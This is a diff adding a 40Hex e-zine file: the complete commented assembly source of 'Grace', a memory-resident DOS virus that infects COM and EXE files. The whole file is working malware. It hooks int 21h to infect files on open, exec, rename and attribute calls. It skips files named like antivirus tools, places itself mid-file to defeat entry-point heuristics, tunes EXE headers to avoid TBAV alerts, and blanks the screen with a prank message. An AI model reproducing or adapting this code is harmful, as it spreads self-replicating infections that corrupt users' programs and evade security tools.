@@ -1,0 +1,844 @@
+40Hex Number 14 Volume 5 Issue 1                                      File 009
+
+;==============================================================================
+;
+; Grace
+;
+; Mid-file COM/EXE TSR infector, 1294 bytes
+;
+; This virus employs a brand new infection mechanism such that virus
+; scanners which only check the entry points will fail.  ie. heuristics
+; are (so far) worthless against this virus.  However this opens the virus
+; up to signature scanning vulnerability because the entry point code
+; is fixed and very specific.  The next version of this virus will feature
+; a general architectural reconstruction, multiple-block displacement
+; and also polymorphism, so keep your eyes peeled for that one.
+;
+; I know there has been another virus which has done mid-file infection
+; (Commander Bomber) but that uses a different method which achieves
+; a similar result (ie, infection in the middle of the host).  However
+; the implementation illustrated in this virus is a more simple
+; rendition of the idea, it simply has a 'wrapper' which relocates blocks
+; etc. into the appropriate positions before the virus proper gains
+; control.  Cmdr Bomber, on the other hand, inserts multiple polymorphic
+; jumps, but only infects .com files.
+;
+; This code is getting on (about 8 months) and has a few drawbacks.  It
+; just took too much stuffing around writing it that I didn't want to
+; change it! :> .. for example the abovementioned susceptibility to sig
+; scanning.. also the relocation of the entire header information to the
+; end of the exe file (lame..) which requires heaps more memory than the
+; average virus and suspicious extra disk accesses.  Also, it was written
+; to be compiled with a86 [1988] so the stuff at the end I had to count up
+; manually.  So I don't use TASM, and dont do my tabs right.. that's my
+; problem. :>  ..If I'd known how much mucking around this virus would
+; have taken to write before I'd written it, I wouldn't have bothered.
+; But I didn't, so I did, and here's the final product.  It works! ;)
+;
+; There's a lot of commenting on this thing (left over from a tutorial I
+; did for someone) so it's not *too* difficult to understand if you are
+; taking a stroll through the code.. it's also pretty modular and some parts
+; have just been fitted in without much optimization (eg the filename
+; and extension checking routine could have been redone because there's only
+; 2 allowable extensions).
+;
+; Apart from residing around the middle of the host it's pretty much just
+; your standard virus.. it infects COM/EXE files on open, attrib, exec,
+; move, and extended open.. also on program termination via function 4ch
+; there's a chance the happy message "Have a nice DOS!" or "Have a nice
+; piss-up!" will appear after blanking the screen.  I personally hate
+; programs which think they're being humourous with this little number, so
+; there you go.. have fun.
+;
+; -T„L”N 02/95-
+;
+;==============================================================================
+;
+; when you run it, run it with a debugger, at the entry point to the actual
+; virus (ie not the relocation wrapper) needs PSP in BP, and virus offset
+; in memory in DI .. ie 100h if you're executing the  kernal. in other
+; words, there's no way this virus can be 'accidentally' compiled and
+; run, because it will crash unless you do the above step..
+;
+;------------------------------------------------------------------------------
+;
+; Some equates and stuff for use within the virus ..
+;
+
+org 0                                   ; will be assembled with start of 0
+
+@JO     equ     070h                    ; JO operand for variable branch
+@JMPS   equ     0ebh                    ; JMP SHORT
+@tsrchk equ     6968h                   ; our tsr check
+p_len   equ     5120/16                 ; amount of memory we take up
+@marker equ     'PK'                    ; marker for infected file
+load    equ     1536                    ; scratch area offset
+vstack  equ     1536                    ; ceiling for our own stack .. = load
+k_len   equ     52                      ; length of relocation code
+ek_len  equ     36                      ; length of extra relocation code
+s_len   equ     48                      ; length of temp EXE stack
+
+;------------------------------------------------------------------------------
+
+                ; assumes DI points to virus start
+                ;         ES = PSP
+v_start:        push di
+                mov cx, cs
+                mov ax, @tsrchk         ; int 21h will return an error
+                int 21h                 ; unless our virus is already TSR
+                xor bx, ax              ; is bx xor ax = 0 ??  (will be if TSR)
+                jz bail                 ; jump if zero to a bail routine
+                                        ; otherwise install ourselves TSR.
+
+                mov ax, bp              ; in segment PSP-1 is the MCB chain.
+                dec ax                  ; We will edit that to get us some
+                                        ; memory to hide in.
+
+memloop:        mov ds, ax                      ; set data segment
+                cmp byte ptr [0], 'Z'           ; is it the last block?
+                je fixmem
+                mov bx, ax                      ; keep segment of prev. block
+                add ax, word ptr [3]            ; AX now equals seg of next MCB
+                inc ax
+                jmp short memloop               ; and check it ..
+
+fixmem:         cmp word ptr [3], p_len*10      ; is block too small?
+                jae fm_ok
+                mov ds, bx                      ; yeah, use previous block
+                xchg ax, bx
+fm_ok:          sub word ptr [3], p_len         ; steal the memory we need
+                add ax, word ptr [3]            ; get its segment value
+                inc ax
+                mov word ptr [12h], ax          ; and feed it to the PSP of
+                                                ; the host program - otherwise
+                                                ; command.com will crash
+
+                mov es, ax                      ; ES = destination segment for
+                push cs                         ; the move..
+                pop ds                          ; DS = source segment
+                xor di, di
+                push cx
+                mov cx, v_len                   ; # of bytes to move
+                cld                             ; forward direction...
+                rep movsb                       ; move CX bytes ds:si -> es:di
+                pop cx
+gethi:          push es                         ; push dest. seg on stack
+                mov ax, offset dms              ; and the offset of where to go
+                push ax
+                retf                            ; and jump there.
+
+dms:            xor ax, ax
+                mov ds, ax
+                mov si, 21h*4                   ; offset of int 21h vector
+                movsw                           ; mov word from DS:SI to ES:DI
+                movsw                           ; and again
+                sub si, 4
+                mov word ptr [si], offset new21 ; revector int 21h
+                mov word ptr [si+2], cs
+
+; we have saved the old int 21h value so we can still jump to it, and we have
+; put our offset and segment in its place -- so every time an int 21h call
+; is issued, control is passed to the virus.  Now let's split.
+
+                xor si, si                      ; zero si since we've relocated
+bail:           mov es, bp                      ; restore to ES the PSP segment
+                push cs                         ; and let DS be our CS
+                pop ds
+                add si, offset old_shit         ; point SI to our old data
+gl:             jo exit_exe                     ; JO changed to JMP in EXE
+                mov di, 0100h                   ; COMs always start execution
+                add sp, 2
+                push bp                         ; at PSP:100h
+                push di
+                movsw                           ; restore host's original 5
+                movsw
+                movsb
+                jmp short zero_shit             ; split
+exit_exe:       add bp, 10h
+                lodsw
+                add ax, bp
+                xchg ax, bx
+                lodsw
+                pop di
+relo_stuff:     mov ss, bx
+                xchg ax, sp
+                lodsw                           ; now get the starting address
+                xchg ax, bx                     ; from where we've stored it.
+                lodsw
+                add ax, bp
+                mov ds, cx                      
+                xchg si, di                     ; DS:SI = relocation table
+                push ax                         ; push exe CS:IP onto stack...
+                push bx
+                lodsw                           ; # of relocation items
+                xchg cx, ax
+                jcxz rldone
+relo_loop:      lodsw                           ; relocate them...
+                xchg ax, di
+                lodsw
+                add ax, bp
+                mov es, ax
+                add word ptr es:[di], bp
+                loop relo_loop
+rldone:         sub bp, 10h
+zero_shit:      xor ax, ax                      ; clean our hands
+                mov bx, ax
+                mov cx, ax
+                cwd
+                mov si, ax
+                mov di, ax
+                mov ds, bp                      ; DS=ES=PSP ..
+                mov es, bp
+                mov bp, ax                      ; everything = 0...
+                retf                            ; I didn't see nothin!
+
+old_shit:       int 20h                 ; 4 words to store either the
+        dw      0,0,0                   ; old EXE header values or the
+                                        ; old COM header info.
+
+        db      '-[Grace] by T„L”N 94-'
+
+;
+; end of installation routine.
+;
+;------------------------------------------------------------------------------
+;
+; The 'Have a nice DOS!' or 'Have a nice piss-up!' effect.
+;
+
+hahaha:         in al, 40h
+                cmp al, 0e0
+                jbe ha_ex
+                push bx
+                push dx
+                push ds
+                mov ah, 0fh
+                int 10h                         ; get video mode
+                xor ah, ah
+                int 10h                         ; clear that mode's screen
+                mov ah, 2
+                xor dx, dx
+                int 10h
+                push cs
+                pop ds
+                mov ah, 9
+                mov dx, offset msg              ; print the msg
+                call i21
+                in al, 40h
+                xchg ah, al
+                in al, 40h
+                xor al, ah
+                cmp al, 0a0h
+                jbe nicedos
+                mov dx, offset XXXX
+                jmp short prp
+nicedos:        mov dx, offset doss
+prp:            mov ah, 9
+                call i21
+                pop ds
+                pop dx
+                pop bx
+ha_ex:          jmp short yeppo
+
+        db      'You make me sick I make viruses'
+
+;------------------------------------------------------------------------------
+
+new21:          cmp ax, @tsrchk                 ; is it us checking residence?
+                jne n2
+                mov bx, ax                      ; yep, make BX = AX
+                iret                            ; and return from interrupt.
+n2:             push ax
+                xchg ah, al
+                cmp al, 3dh                     ; OPEN?
+                je letsgo
+                cmp al, 43h                     ; ATTRIB?
+                je letsgo
+                cmp al, 4bh                     ; EXEC?
+                je letsgo
+                cmp al, 4ch                     ; EXIT?
+                je hahaha
+                cmp al, 56h                     ; RENAME?
+                je letsgo
+                cmp al, 6ch                     ; EXT_OPEN?
+                jne yeppo
+                push dx
+                mov dx, si
+                call infect
+                pop dx
+                jmp short yeppo
+letsgo:         call infect                     ; call the infection routine
+yeppo:          pop ax                          ; restore AX
+n21_2:          jmp dword ptr cs:[old21]        ; and act as if nothing's up
+
+new24:          mov al, 3                       ; a cool critical error handler
+                iret                            
+
+file_end:       mov ax, 4202h                   ; some internal virus functions
+                jmp short seek_vals
+file_zero:      mov ax, 4200h
+seek_vals:      xor cx, cx
+                xor dx, dx
+i21:            pushf                           ; simulate an int 21h
+                push cs
+                call n21_2
+                ret
+
+; the working horse of the virus.
+
+infect:         push ax                         ; save all the registers
+                push bx                         ; that we'll be screwing with
+                push cx
+                push dx
+                push si
+                push di
+                push ds
+                push es
+
+; now, we need to save the name of the file we're dealing with at a permanent
+; location so that it's easier to reference.  We also need to check to see if
+; it's an invalid filename (ie. contains SC (eg Scan), CL (clean) etc etc.).
+
+                push cs
+                pop es
+                mov di, offset filename
+                mov si, dx                      ; on all the above calls,
+                                                ; DS:DX points to the filename.
+                                                ; we put it in SI for the LODSB
+                                                ; instruction.
+storename:      lodsb                           ; [DS:SI] -> AL
+                stosb                           ; AL -> [ES:DI]
+                or al, al                       ; is it 0 (end of ASCIIZ string)?
+                jnz storename                   ; if not, keep going
+
+                push cs                         ; toss out old data segment,
+                pop ds                          ; we don't need it now.
+
+; now we check the name and the extension.
+; [this could do with a rewrite]..
+
+                mov dx, di
+                sub dx, 4                       ; DX points to extension
+                lea si, [di-12]                 ; SI = DI - 12
+                cmp si, offset filename+1       ; is it too far back?
+                jae kkk1
+                mov si, offset filename+1       ; yep, point it right
+kkk1:           dec si
+                cmp si, dx                      ; is SI up to extension yet?
+                je kkk2
+                lodsw                           ; no, check the word at SI...
+                and ax, 0dfdfh                  ; capitalize the letters
+                push di
+                mov di, offset fucks
+                mov cx, @fucks                  ; 4 things to check for...
+                repne scasw                     ; this is:
+                                                ; "keep comparing AX to [ES:DI]
+                                                ;  while AX <> [ES:DI] or until
+                                                ; CX = 0. ie find if AX matches
+                                                ; any of the disallowed things.
+                pop di
+                jne kkk1                        ; try next 2 if no match..
+                jmp short ncexit_err            ; otherwise we don't infect.
+
+kkk2:           mov di, offset exts             ; valid extensions
+                mov cx, @exts
+                cld
+                lodsw
+                and ax, 0dfdfh                  ; -> uppercase
+extchk:         scasw                           ; does AX match extension?
+                je extchk_2
+                inc di                          ; nope, try next extension
+                loop extchk                     ; loop until cx=0
+ncexit_err:     jmp bitch                       ; .. if not valid extension,
+                                                ; terminate infection routine
+
+extchk_2:       lodsb                           ; otherwise check 3rd byte
+                and al, 0dfh
+                scasb
+                jne ncexit_err
+
+; set int 24h to our own so we don't get annoying "Write protect error" etc.
+
+set24:          mov ax, 3524h                   ; get int 24h vector
+                call i21
+                push es                         ; save it on the stack
+                push bx
+                mov dx, offset new24
+                mov ax, 2524h                   ; set int 24h vector
+                call i21
+                push cs
+                pop es
+
+; now set the file attributes to zero...
+
+setattrib:      mov ax, 4300h                   ; AX=4300h, Get attribs of file
+                mov dx, offset filename         ; DS:DX, filename
+                call i21
+                push cx                         ; ..save them..
+                mov ax, 4301h
+                xor cx, cx
+                call i21                        ; and zero them out.
+                jc bitch1                       ; if error, bail ...
+
+; now we can safely open the file.
+
+                mov ax, 3d02h                   ; open file, read/write access
+                call i21
+                xchg ax, bx                     ; put file handle into bx
+                mov ax, 5700h                   ; get the file's date/time
+                call i21
+                push cx
+                push dx
+
+; check to see if the file is a COM or an EXE, according to its hdr structure.
+
+                call file_zero                  ; seek to beginning of file
+                mov ah, 3fh
+                mov cx, 26
+                mov dx, offset signature
+                call i21                        ; read 24 bytes (header info)
+
+                xor ax, cx                      ; bail if < 26 bytes read
+                jnz bitch2
+
+                mov ax, @marker                 ; is there an infection marker?
+                cmp word ptr [signature+3], ax  ; [com]
+                je bitch2                       ; yep, it's already infected
+                cmp word ptr [chksum], ax       ; [exe]
+                je bitch2
+
+                mov si, dx
+                lodsb
+                cmp al, 'M'                     ; EXEs start with MZ or ZM
+                je goexe
+                cmp al, 'Z'
+                je goexe
+                call cominf                     ; otherwise it's a COM file
+                jmp short write_hdr
+goexe:          call exeinf
+write_hdr:      call file_zero                  ; seek to start of file
+                mov ah, 40h
+                mov cx, 26
+                mov dx, offset signature
+                call i21                        ; write patched header
+
+bitch2:         pop dx                          ; restore the file's date/time
+                pop cx
+                mov ax, 5701h
+                call i21
+
+                mov ah, 3eh                     ; and close it.
+                call i21
+
+bitch1:         pop cx                          ; restore file's original
+                mov ax, 4301h                   ; file attributes
+                mov dx, offset filename
+                call i21
+
+                pop dx                          ; get original i24h
+                pop ds
+                mov ax, 2524h
+                call i21                        ; and reinstate it
+
+bitch:          pop es                          ; restore all the registers...
+                pop ds
+                pop di
+                pop si
+                pop dx
+                pop cx
+                pop bx
+                pop ax
+                ret                             ; and exit the infect routine.
+
+cominf:         mov di, offset old_shit
+                stosb
+                movsw                           ; save first 5 bytes
+                movsw
+                call file_end
+                or dx, dx                       ; COM >64k?
+                jnz com_done
+                cmp ax, 0f800h                  ; COM >60k?
+                jae com_done
+                push ax
+                mov byte ptr [gl], @JO
+                mov word ptr [k1+1], 0
+                ; we need a random value between 5 and (eof-v_len)
+                sub ax, (v_len)+5
+                jc com_done2
+                call rnd_num
+                add ax, 105h                    ; DX:AX is file offset of virus
+                mov word ptr [k2+1], ax
+                dec ah
+                push ax
+                call file_end
+                add ax, v_len + k_len + 100h
+                mov word ptr [k3+1], ax
+                pop ax
+                stc
+                call write_us
+                mov di, offset signature
+                mov al, 0e9h                    ; now build us a JMP
+                stosb
+                pop ax
+                dec ax                          ; ...
+                dec ax
+                dec ax
+                stosw
+                mov ax, @marker                 ; put in the infection marker
+                stosw
+com_done:       ret
+com_done2:      pop ax
+                ret
+
+; this EXE infection is quite exhaustive in order to screw up the least amount
+; of EXE files possible.  A virus shows itself up when it wrecks things ..
+; therefore it makes sense not to wreck things, hmm?
+
+exeinf:         ; we have to check for internal overlays
+                ; if present, don't infect the file
+                call file_end
+                push ax                         ; check for internal overlays
+                push dx
+                mov ax, word ptr [page_cnt]     ; calculate how big the code
+                mov cx, 512                     ; part of the EXE is, according
+                mul cx                          ; to its header info ...
+                pop cx
+                pop bp
+                cmp ax, bp                      ; and compare it to the actual
+                jb com_done                     ; file's size.
+                cmp dx, cx                      ; if calc<actual then it must have
+                jb com_done                     ; internal overlays -- bail.
+
+                ; store the old SS:SP, CS:IP
+
+                mov di, offset old_shit
+                mov si, offset relo_ss
+                movsw
+                movsw
+                lodsw
+                movsw
+                movsw
+
+                ; append k_code to EOF & find a block to move as well...
+
+                call file_end
+                mov byte ptr [gl], @JMPS
+                mov cx, 10h                     ; # of paragraphs in whole file
+                div cx
+                sub ax, word ptr [hdr_size]     ; except the header
+                mov word ptr [relo_cs], ax
+                dec ax
+                mov word ptr [relo_ss], ax
+                mov word ptr [exe_ip], dx
+                push dx
+                xchg ax, dx
+                add ax, v_len + ek_len + k_len
+                mov word ptr [k3+1], ax
+                mov word ptr [ek1+1], ax
+
+                ; the minmem/maxmem stuff is not really necessary to the
+                ; viability of infection, but TBAV screams if the header
+                ; isn't perfect.  One less thing for TBAV to pick up...
+
+                mov ax, -10240/16               ; a -ve value to save code
+                cmp word ptr [minmem], ax       ; (hehe is 10k enough??)
+                jae di0
+                sub word ptr [minmem], ax       ; subtract -ve = add
+di0:            cmp word ptr [maxmem], ax
+                jae dont_inc
+                sub word ptr [maxmem], ax
+dont_inc:       pop ax
+                add ax, v_len + ek_len + k_len + s_len + 10h
+                mov cx, word ptr [relocnt]
+                shl cx, 1
+                shl cx, 1
+                add ax, cx
+                shr ax, 1                       ; make SP even
+                shl ax, 1
+                mov word ptr [exe_sp], ax
+
+                call file_end           ; calculate the size of the file
+                push dx                 ; minus the header
+                push ax
+                mov ax, word ptr [hdr_size]
+                mov dx, 10h
+                mul dx
+                mov word ptr [hdr], ax
+                mov word ptr [hdr+2], dx
+                pop ax
+                sub ax, word ptr [hdr]
+                pop dx
+                sbb dx, word ptr [hdr+2]
+                sub ax, v_len
+                sbb dx, 0
+                call rnd_num            ; & select a random # in that range
+                push ax
+                push dx
+                mov cx, 10h
+                div cx
+                add ax, 10h
+                mov word ptr [k1+1], ax
+                mov word ptr [k2+1], dx
+                pop dx
+                pop ax
+                add ax, word ptr [hdr]
+                adc dx, word ptr [hdr+2]
+                clc
+                call write_us
+
+                mov cx, 512                     ; calculate new # of code pages
+                div cx
+                or dx, dx                       ; any bits left over?
+                jz fp2
+                inc ax                          ; yes, inc # pages
+fp2:            mov word ptr [part_page], dx    ; update the info
+                mov word ptr [page_cnt], ax
+                mov word ptr [chksum], @marker  ; tag as infected
+                ret
+
+write_us:       ; calling parameters:
+                ; k1, k2 and k3 have been taken care of
+                ; DX:AX contains file offset of part to save & overwrite
+                ; this routine was once simple, but programming nightmares
+                ; caused it to get cancerous outgrowths.
+                ; (although i prefer not to call my programming a cancerous
+                ;  outgrowth)...
+                pushf
+                mov cx, dx
+                xchg ax, dx
+                mov ax, 4200h
+                call i21                        ; seek to this area
+                popf
+                push ax
+                push dx
+                mov dx, offset load
+                mov cx, v_len
+                push cx
+                push dx
+                mov ah, 3fh
+                pushf
+                call i21                        ; read old contents
+                call file_end
+                mov cx, k_len
+                mov dx, offset k_kode
+                popf
+                pushf
+                jc wu2
+                ; deviation for exe files
+                add cx, ek_len
+                mov dx, offset ek_kode
+wu2:            mov ah, 40h
+                call i21                        ; write the entry beast
+                popf
+                pop dx
+                pop cx
+                pushf
+                mov ah, 40h
+                call i21                        ; write the displaced code
+                popf
+                pop cx
+                pop dx
+                pushf
+                mov ax, 4200h
+                call i21                        ; seek to area we got it from
+                mov ah, 40h
+                mov cx, v_len
+                xor dx, dx
+                call i21                        ; & write over it with ourself
+                call file_end
+                popf
+                jc wuret
+                ; write the EXE header to EOF
+                mov ah, 40h
+                mov cx, 2
+                mov dx, offset relocnt
+                call i21
+                xor cx, cx
+                mov dx, word ptr [tabloff]
+                mov ax, 4200h
+                call i21                        ; seek to reloc'n table start
+                mov cx, word ptr [relocnt]
+                shl cx, 1
+                shl cx, 1
+                jcxz reloend
+
+move_reloc:     push bp                         ; moves the relocation table
+                push ax                         ; to EOF...
+                push dx
+                mov ax, 3072                    ; = size of blocks to move
+                mov bp, ax                      ; (3k at a time)
+                cmp cx, ax
+                jb mr2
+                mov word ptr [mr1+1], ax
+                sub cx, ax
+                pop dx
+                pop ax
+                add ax, bp
+                adc dx, 0
+                push ax
+                push dx
+                push cx
+                jmp $+2                         ; clear the prefetch queue
+mr1:            mov cx, 0
+mr2:            mov ah, 3fh
+                mov dx, offset load
+                push dx
+                call i21
+                push ax
+                call file_end
+                pop cx
+                mov ah, 40h
+                pop dx
+                call i21
+                pop cx
+                jcxz reloend2
+                mov bp, cx
+                pop cx
+                pop dx
+                mov ax, 4200h
+                call i21
+                mov cx, bp
+                pop bp
+                jmp short move_reloc
+reloend2:       pop bp
+                pop bp
+reloend:        mov word ptr [relocnt], 0
+                call file_end
+                mov ah, 40h
+                mov cx, s_len
+                call i21                        ; add a stack
+                call file_end
+wuret:          ret                             ; and return.
+
+rnd_num:        ; calling parameters:
+                ; DX:AX contains dword, highest # allowed
+                ; returns:
+                ; DX:AX the selected offset
+                ; CX destroyed
+                push dx
+                push ax
+                xor ax, ax                      ; get an arbitrary number
+                int 1ah
+                xchg cx, dx
+                pop ax
+                pop dx
+                or dx, dx                       ; is DX:AX <64k?
+                jnz rn2
+rn1:            cmp ax, cx                      ; is denominator bigger than
+                jnb rn2                         ; the numerator?
+                shr cx, 1
+                jmp short rn1
+rn2:            div cx                          ; divide DX:AX by CX
+                mul cx                          ; and multiply again
+                ret                             ; (got rid of remainder)
+
+; data ..
+
+msg     db      'Have a nice $'
+XXXX    db      'piss-up!',0d,0a,'$'    ; sink some XXXX ales..
+doss    db      'DOS!',0d,0a,'$'
+
+fucks   db      14h,'DCOSCCLVSF-'       ; invalid words in filename
+               ;^^^ this is '4' AND 0DFh, to fit in with capitalization routine
+@fucks  equ ($-fucks)/2
+
+exts    db      'COMEXE'                ; valid extensions
+@exts   equ ($-exts)/3
+
+;------------------------------------------------------------------------------
+
+; This is the actual entry point of the infected file.
+; Its job is to relocate the actual virus from elsewhere in the file
+; and patch up the area where the virus was with the old data.
+
+ek_kode:        mov bp, ds      ;2      ; this is only written on EXE infection
+                push cs         ;1
+                pop ds          ;1
+                push cs         ;1
+                pop es          ;1
+ek1:            mov si, 0       ;3      ; same as k3
+                lodsw           ;1      ; first word = # of relocation items
+                shl ax, 1       ;2
+                shl ax, 1       ;2
+                add si, ax      ;2
+                lea di, [si+v_len] ;4   ; where to reloc'n items to
+                lea sp, [di+s_len+10h] ;3
+                push ax         ;1
+                xchg ax, cx     ;1
+                std             ;1
+                jcxz ekdone     ;2
+                rep movsb       ;2      ; move the relocation table
+                movsb           ;1
+ekdone:         movsb           ;1
+                movsb           ;1
+                cld             ;1
+                mov ds, bp      ;2
+
+k_kode:         mov ax, ds      ;2
+                mov bp, ax      ;2
+k1:             add ax, 0       ;3      ; seg displacement of virus code
+                mov ds, ax      ;2
+k2:             mov si, 0       ;3      ; ofs displacement of virus code
+                push cs         ;1
+                pop es          ;1
+k3:             mov di, 0       ;3      ; where we want to move it
+                mov cx, v_len   ;3
+                rep movsb       ;2
+                push ds         ;1      ; now we restore the old data
+                push es         ;1
+                pop ds          ;1      ; exchange the segments
+                pop es          ;1
+                xchg si, di     ;2      ; and pointers
+                mov ax, v_len   ;3
+                sub si, ax      ;2      ; and adjust them
+                sub si, ax      ;2
+                push si         ;1
+                sub di, ax      ;2
+                xchg ax, cx     ;1
+                push cx         ;1
+                rep movsb       ;2
+                push cs         ;1      ; now it's done.. make segs ours..
+                pop es          ;1
+                pop cx          ;1
+                pop di          ;1
+                rep movsb       ;2      ; copy virus code to v_end...
+                jmp $+2         ;2      ; and clear processor's prefetch queue
+                xchg si, di     ;2      ; si points to virus code
+                                        ; di points to relocation info
+                                ;52 bytes
+v_end:
+
+;------------------------------------------------------------------------------
+;
+; data which needn't be carried around when the virus spreads.
+;
+
+old21           equ $
+
+hdr             equ old21 + 4           ; store for calc'd length of EXE header
+reloc           equ hdr + 4             ; temp store for relocation data in EXE
+signature       equ reloc + 4           ; where we load the host file's header
+part_page       equ signature + 2       ; part-page at EOF  ((this is for EXE header))
+page_cnt        equ part_page + 2       ; count of code pages
+relocnt         equ page_cnt + 2        ; # of relocation items in table
+hdr_size        equ relocnt + 2         ; size of header in paragraphs
+minmem          equ hdr_size + 2        ; minimum memory required
+maxmem          equ minmem + 2          ; maximum memory required
+relo_ss         equ maxmem + 2          ; displacement of stack segment (SS)
+exe_sp          equ relo_ss + 2         ; stack pointer (SP)
+chksum          equ exe_sp + 2          ; infection marker in EXEs
+exe_ip          equ chksum + 2          ; instruction pointer (IP)
+relo_cs         equ exe_ip + 2          ; displacement of code segment (CS)
+tabloff         equ relo_cs + 2         ; offset of EXE relocation table
+                                        ; 26 bytes for EXE header
+oldss           equ tabloff + 2
+oldsp           equ oldss + 2
+filename        equ oldsp + 2           ; filename of target file
+
+v_len           equ v_end - v_start
+
+;
+; the end.
+;
+;------------------------------------------------------------------------------
+
